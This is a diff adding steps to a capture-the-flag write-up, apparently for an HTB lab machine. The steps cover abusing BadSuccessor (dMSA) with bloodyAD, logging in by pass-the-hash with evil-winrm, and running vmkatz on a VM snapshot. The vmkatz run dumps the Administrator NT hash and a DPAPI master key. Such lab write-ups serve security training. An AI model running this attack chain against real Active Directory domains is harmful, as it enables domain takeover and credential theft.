@@ -123,3 +123,48 @@ checkpoint\ryan.brooks
 
 <mark style="color:blue;">**Step 4**</mark>
 
+**We abuse the DMSA group using Badsuccessor we earlier talk about this in eighteen htb machine**
+
+```bash
+fake_dc $dc bloodyAD -d 'checkpoint.htb' -u 'ryan.brooks' -k --host 'DC01.checkpoint.htb' --dc-ip $ip add badSuccessor bad_DMSA -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
+
+fake_dc $dc evil-winrm -i 10.129.13.81 -u svc_deploy -H 'e16081eb077aca74bdbf8af12af43ac9'
+```
+
+<mark style="color:blue;">**Step 5**</mark>
+
+<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-06-15 043322.png" alt=""><figcaption></figcaption></figure>
+
+**Our user is in backupacees so the idea is to dump the ntds so we need to enumarate**
+
+{% code overflow="wrap" %}
+```powershell
+Get-ChildItem -Path C:\ -Recurse -Include "*.vhdx","*.vhd","*.vmdk","*.vbk" -ErrorAction SilentlyContinue
+#    Directory: C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics
+
+
+# Mode                 LastWriteTime         Length Name
+# ----                 -------------         ------ ----
+# -a----          5/9/2026   7:45 PM      106496000 Windows Server 2019-000001.vmdk
+# -a----          5/9/2026   7:39 PM    10199695360 Windows Server 2019.vmdk
+```
+{% endcode %}
+
+<mark style="color:blue;">**Step 6**</mark>
+
+{% code overflow="wrap" %}
+```powershell
+.\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn"
+
+  Username: Administrator
+    NT Hash : f29e9c014295b9b32139b09a2790be3b
+    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
+    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
+  [DPAPI]
+    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
+    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
+    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595
+
+```
+{% endcode %}
+
